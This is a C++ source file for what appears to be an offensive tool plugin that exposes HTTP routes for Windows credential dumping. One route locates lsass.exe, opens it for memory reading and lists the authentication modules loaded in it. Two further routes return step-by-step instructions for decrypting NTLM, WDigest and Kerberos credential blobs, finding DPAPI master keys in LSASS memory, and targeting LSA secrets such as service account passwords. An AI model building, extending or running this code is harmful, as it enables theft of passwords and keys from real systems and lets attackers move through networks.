#include "plugin.h"
#include "../http_router.h"
#include <nlohmann/json.hpp>
#include <tlhelp32.h>
using json = nlohmann::json;

namespace handlers {

void register_lsass_dpapi_routes(c_http_router& router) {

    // Enumerate LSASS logon sessions by locating the process
    router.post("/api/lsass/list_sessions", [](const httplib::Request& req, httplib::Response& res) {
        json result;
        result["sessions"] = json::array();

        // Find lsass.exe PID
        DWORD lsassPid = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {sizeof(pe)};
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                        lsassPid = pe.th32ProcessID;
                        break;
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        result["lsass_pid"] = lsassPid;
        if (lsassPid == 0) {
            result["error"] = "lsass.exe not found in process list";
            res.set_content(result.dump(), "application/json");
            return;
        }

        // Open lsass with read privileges (requires SeDebugPrivilege)
        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
        result["handle_acquired"] = (hLsass != nullptr && hLsass != INVALID_HANDLE_VALUE);

        // Known LogonSessionList offsets vary by Windows version
        result["logon_session_offsets"] = {
            {"Windows_10_1903_x64", "LogonSessionList+0x38 = _LSA_LOGON_SESSION linked list"},
            {"Windows_11_22H2_x64", "lsasrv.dll!LogonSessionList symbol"},
            {"session_struct_fields", {
                "LocallyUniqueIdentifier (LUID)",
                "UserName (LSA_UNICODE_STRING)",
                "LogonDomain (LSA_UNICODE_STRING)",
                "AuthenticationPackage",
                "LogonType",
                "Session",
                "Sid",
                "LogonTime"
            }}
        };

        // Enumerate loaded modules in LSASS for SSP package identification
        result["ssp_packages"] = json::array();
        if (hLsass) {
            HANDLE hModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, lsassPid);
            if (hModSnap != INVALID_HANDLE_VALUE) {
                MODULEENTRY32W me = {sizeof(me)};
                if (Module32FirstW(hModSnap, &me)) {
                    do {
                        char name[MAX_PATH] = {};
                        WideCharToMultiByte(CP_UTF8, 0, me.szModule, -1, name, sizeof(name), nullptr, nullptr);
                        std::string modName(name);
                        if (modName.find("msv") != std::string::npos ||
                            modName.find("wdigest") != std::string::npos ||
                            modName.find("kerberos") != std::string::npos ||
                            modName.find("lsasrv") != std::string::npos ||
                            modName.find("samsrv") != std::string::npos ||
                            modName.find("dpapi") != std::string::npos) {
                            json pkg;
                            pkg["module"] = modName;
                            pkg["base"] = (uintptr_t)me.modBaseAddr;
                            pkg["size"] = (uintptr_t)me.modBaseSize;
                            result["ssp_packages"].push_back(pkg);
                        }
                    } while (Module32NextW(hModSnap, &me));
                }
                CloseHandle(hModSnap);
            }
            CloseHandle(hLsass);
        }

        result["note"] = "Requires SeDebugPrivilege. LogonSessionList walker locates credential blobs for msv1_0 (NTLM), wdigest (cleartext if enabled), and kerberos SSP packages.";
        res.set_content(result.dump(), "application/json");
    });

    // Read credential blob structure offsets
    router.post("/api/lsass/read_credential_blobs", [](const httplib::Request& req, httplib::Response& res) {
        json body;
        try { body = json::parse(req.body); } catch (...) { body = json::object(); }

        json result;
        result["credential_structures"] = {
            {"msv1_0", {
                {"struct","MSV1_0_PRIMARY_CREDENTIAL"},
                {"fields",{"NtOwfPassword (NT hash)","LmOwfPassword (LM hash)","UserName","LogonDomainName"}},
                {"encryption","RC4/AES128 with LSAInitializeProtectedMemory key (lsasrv.dll!LsaProtectMemory)"}
            }},
            {"wdigest", {
                {"struct","WDIGEST_LIST_ENTRY"},
                {"fields",{"Username","Hostname","Password (cleartext when Uselogoncredential=1)"}},
                {"encryption","RC4 with session key derived from logon LUID"}
            }},
            {"kerberos", {
                {"struct","KERBEROS_LOGON_SESSION"},
                {"fields",{"credentials (KERB_CREDENTIALS)","Tickets list","ServiceName","TargetName"}},
                {"encryption","AES256/RC4 session keys"}
            }}
        };
        result["extraction_chain"] = {
            "1. Enumerate LogonSessionList to find _LSA_LOGON_SESSION nodes",
            "2. Follow Credentials pointer to MSV1_0_PRIMARY_CREDENTIAL",
            "3. Read EncryptedCredentials buffer",
            "4. Decrypt using BCryptDecrypt with key from lsasrv.dll!LsaUnprotectMemory",
            "5. Parse decrypted UNICODE_STRING fields"
        };
        result["dpapi_keys"] = {
            {"master_key_location","C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User"},
            {"lsass_cache","LogonSessionList -> DpapiKey field -> _DPAPI_MASTER_KEY_CACHE"},
            {"guid_format","XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"}
        };
        res.set_content(result.dump(), "application/json");
    });

    // Locate DPAPI master keys in LSASS memory
    router.post("/api/lsass/locate_dpapi_keys", [](const httplib::Request& req, httplib::Response& res) {
        json result;
        result["dpapi_architecture"] = {
            {"master_key_store","\\Microsoft\\Protect\\<SID>\\<GUID>"},
            {"lsass_cache_struct","_DPAPI_MASTER_KEY_CACHE linked list in lsasrv.dll"},
            {"backup_key","Domain backup key stored in AD (Active Directory LSA secret)"},
            {"protection","Master key encrypted with user password via SHA1+3DES or SHA512+AES256"}
        };
        result["hunt_strategy"] = {
            {"step1","Locate lsasrv.dll in LSASS process memory map"},
            {"step2","Find g_pCacheHead symbol (DPAPI master key cache head pointer)"},
            {"step3","Walk _DPAPI_MASTER_KEY_CACHE.ListEntry linked list"},
            {"step4","Extract cbMasterKey and pbMasterKey buffer (32 bytes for AES256)"},
            {"step5","Correlate GUID with on-disk master key file for offline verification"}
        };
        result["lsa_secrets_targets"] = {
            "DPAPI_SYSTEM (machine DPAPI key)",
            "$MACHINE.ACC (machine account password)",
            "_SC_<ServiceName> (service account passwords)",
            "DefaultPassword (autologon credential)",
            "NL$KM (domain cached credential key)"
        };
        res.set_content(result.dump(), "application/json");
    });
}

} // namespace handlers
